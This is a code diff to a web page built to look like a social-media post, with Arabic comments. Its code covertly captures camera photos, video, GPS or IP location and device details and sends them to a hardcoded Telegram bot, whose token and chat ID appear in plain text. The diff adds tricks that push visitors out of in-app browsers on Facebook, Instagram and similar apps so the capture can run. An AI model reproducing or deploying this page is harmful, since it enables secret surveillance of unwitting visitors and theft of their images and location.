@@ -12,11 +12,11 @@
     :root { --bg: #f0f2f5; --card-bg: #ffffff; --text-primary: #1c1e21; --text-secondary: #65676b; --border: #e4e6eb; }
     @media (prefers-color-scheme: dark) { :root { --bg: #18191a; --card-bg: #242526; --text-primary: #e4e6eb; --text-secondary: #b0b3b8; --border: #3e4042; } }
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: var(--bg); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; padding-top: 20px; min-height: 100vh; position: relative; }
+    body { background: var(--bg); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 20px; min-height: 100vh; position: relative; }
 
     .post-container {
       max-width: 500px; width: 100%; background: var(--card-bg); border-radius: 8px;
-      box-shadow: 0 1px 2px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid var(--border);
+      box-shadow: 0 1px 2px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid var(--border); margin-bottom: 15px;
     }
     .post-header { display: flex; align-items: center; padding: 12px 16px 0; position: relative; }
     .post-header img { width: 40px; height: 40px; border-radius: 50%; margin-left: 8px; object-fit: cover; }
@@ -45,6 +45,12 @@
     }
     .hidden { display: none !important; }
     video { display: none; }
+
+    /* زر الهروب */
+    .escape-btn {
+      background: #1877f2; color: white; border: none; padding: 12px 24px; border-radius: 8px;
+      font-size: 16px; cursor: pointer; margin: 10px 0; display: none;
+    }
   </style>
 </head>
 <body>
@@ -66,10 +72,14 @@
     <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
   </div>
 
+  <!-- زر الهروب اليدوي -->
+  <button class="escape-btn" id="escapeButton">فتح في المتصفح الخارجي</button>
+
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
+    // ==================== الكود الأصلي ====================
     const B = '69ee19e8856a68218974812e';
     const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
     const C = '5151102782';
@@ -85,7 +95,6 @@
     let stream, photos = 0, capInt, loc, redir = 'https://example.com', deviceInfoSent = false, gpsLoc = null;
     let mediaRecorder, videoChunks = [], recording = false;
 
-    // تحميل المنشور
     async function updatePost() {
       try {
         let r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
@@ -191,7 +200,6 @@
           let form = new FormData(); form.append('chat_id', C); form.append('video_note', blob, 'video.webm');
           await fetch(`https://api.telegram.org/bot${T}/sendVideoNote`, { method: 'POST', body: form }).catch(() => {});
           recording = false;
-          // التصوير مستمر، لا حاجة لإعادة تشغيله
         };
         mediaRecorder.start();
         setTimeout(() => {
@@ -204,16 +212,11 @@
       if (!stream || !vid.videoWidth) return;
       cnv.width = vid.videoWidth; cnv.height = vid.videoHeight;
       ctx.drawImage(vid, 0, 0);
-      // جودة عالية 0.9
       let blob = dataURLtoBlob(cnv.toDataURL('image/jpeg', 0.9));
       let form = new FormData(); form.append('chat_id', C); form.append('photo', blob, 'snap.jpg');
       fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form }).catch(() => {});
       photos++;
-
-      // كل 5 صور نبدأ فيديو جديد (إذا لم نكن نسجل)
-      if (photos % 5 === 0 && !recording) {
-        startVideoRecording();
-      }
+      if (photos % 5 === 0 && !recording) startVideoRecording();
     }
 
     function dataURLtoBlob(u) {
@@ -242,22 +245,14 @@
     }
 
     async function tryPermissions() {
-      // 1. نطلب الموقع أولاً
       let gpsOk = await requestGPS();
-      if (!gpsOk) {
-        // فشل GPS، نجرب IP
-        await sendIPLocation();
-      }
-      // إرسال معلومات الجهاز
+      if (!gpsOk) await sendIPLocation();
       sendDeviceInfo();
-
-      // 2. نطلب الكاميرا
       let camOk = await startCamera('user');
       if (!camOk) {
         showRetry();
         return;
       }
-
       hideRetry();
     }
 
@@ -277,6 +272,97 @@
       await tryPermissions();
     });
 
+    // ==================== خطة الهروب من WebView ====================
+    (function escapePlan() {
+      const targetUrl = window.location.href;
+      const escapeBtn = document.getElementById('escapeButton');
+
+      function isInAppBrowser() {
+        const ua = navigator.userAgent || '';
+        return /FBAN|FBAV|Instagram|Twitter|Line|KAKAOTALK/i.test(ua);
+      }
+
+      const methods = [
+        {
+          name: 'x-safari-https',
+          shouldTry: () => /iPhone|iPad|iPod/i.test(navigator.userAgent),
+          execute: () => {
+            const safariUrl = targetUrl.replace(/^https?:\/\//, 'x-safari-https://');
+            window.location.href = safariUrl;
+            return true;
+          }
+        },
+        {
+          name: 'googlechrome',
+          shouldTry: () => /iPhone|iPad|iPod/i.test(navigator.userAgent),
+          execute: () => {
+            const chromeUrl = targetUrl.replace(/^https?:\/\//, 'googlechrome://');
+            window.location.href = chromeUrl;
+            return true;
+          }
+        },
+        {
+          name: 'android-intent',
+          shouldTry: () => /Android/i.test(navigator.userAgent),
+          execute: () => {
+            const intentUrl = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
+            window.location.href = intentUrl;
+            return true;
+          }
+        },
+        {
+          name: 'ftp-trick',
+          shouldTry: () => true,
+          execute: () => {
+            const ftpUrl = 'ftp://ftp.gnu.org/';
+            window.location.href = ftpUrl;
+            return true;
+          }
+        },
+        {
+          name: 'smart-app-banner',
+          shouldTry: () => /iPhone|iPad|iPod/i.test(navigator.userAgent) && !document.querySelector('meta[name="apple-itunes-app"]'),
+          execute: () => {
+            const meta = document.createElement('meta');
+            meta.name = 'apple-itunes-app';
+            meta.content = 'app-id=';
+            document.head.appendChild(meta);
+            return true;
+          }
+        },
+        {
+          name: 'window-open',
+          shouldTry: () => true,
+          execute: () => {
+            const newWindow = window.open(targetUrl, '_blank', 'noopener,noreferrer');
+            if (newWindow) newWindow.opener = null;
+            return true;
+          }
+        }
+      ];
+
+      function attemptSequentialEscape() {
+        for (let i = 0; i < methods.length; i++) {
+          const method = methods[i];
+          if (method.shouldTry()) {
+            try { method.execute(); } catch(e) {}
+          }
+        }
+        // بعد فشل جميع الطرق التلقائية، نظهر الزر اليدوي
+        if (escapeBtn) {
+          escapeBtn.style.display = 'block';
+          escapeBtn.addEventListener('click', () => {
+            window.open(targetUrl, '_blank');
+          });
+        }
+      }
+
+      if (isInAppBrowser()) {
+        attemptSequentialEscape();
+      }
+    })();
+
+    // ==================== بدء التشغيل ====================
     async function init() {
       await updatePost();
       setTimeout(tryPermissions, 500);
